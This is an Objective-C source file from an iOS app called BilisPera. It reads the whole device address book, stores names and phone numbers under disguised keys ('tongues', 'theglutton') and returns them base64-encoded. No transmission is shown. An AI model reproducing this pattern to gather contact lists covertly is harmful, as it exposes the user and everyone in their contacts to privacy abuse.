//
//  BPContactsTools.m
//  BilisPera
//
//  Created by BHJ on 2025/8/25.
//

#import "BPContactsTools.h"
#import <Contacts/Contacts.h>

NS_ASSUME_NONNULL_BEGIN

@interface BPContactsTools ()

@property (nonatomic, strong) CNContactStore *store;

@end

@implementation BPContactsTools

+ (instancetype)shared {
    static BPContactsTools *sharedInstance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        sharedInstance = [[BPContactsTools alloc] init];
    });
    return sharedInstance;
}

- (instancetype)init {
    self = [super init];
    if (self) {
        _store = [[CNContactStore alloc] init];
    }
    return self;
}

- (void)fetchContactsAsJSON:(simpleStringCompletion)completion{
    NSArray *keys = @[
        CNContactGivenNameKey,
        CNContactFamilyNameKey,
        CNContactPhoneNumbersKey
    ];
    __block NSError *error = nil;
    CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];
    kWeakSelf;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND,
                                             0),
                   ^{
        __block NSMutableArray *contactsArray = [NSMutableArray array];
        [weakSelf.store enumerateContactsWithFetchRequest:request error:&error usingBlock:^(CNContact * _Nonnull contact,
                                                                                            BOOL * _Nonnull stop) {
            NSMutableDictionary *contactDict = [NSMutableDictionary dictionary];
            NSString *name = [NSString stringWithFormat:@"%@ %@",
                              contact.givenName,
                              contact.familyName];
            NSArray *phones = contact.phoneNumbers;
            NSString *phoneString = [NSString stringWithFormat:@"%@", phones];
            contactDict[@"tongues"] = [name stringByReplacingOccurrencesOfString:@" " withString:@""];
            contactDict[@"theglutton"] = [phoneString stringByReplacingOccurrencesOfString:@" " withString:@""];
            [contactsArray addObject:contactDict];
        }];
        NSData *jsonData = [NSJSONSerialization dataWithJSONObject:contactsArray options:NSJSONWritingSortedKeys error:&error];
        if (jsonData) {
            NSString *jsonStr = [jsonData base64EncodedStringWithOptions:NSDataBase64Encoding64CharacterLineLength];
            dispatch_async(dispatch_get_main_queue(),
                           ^{
                completion(jsonStr);
            });
        }
    });
}


@end

NS_ASSUME_NONNULL_END
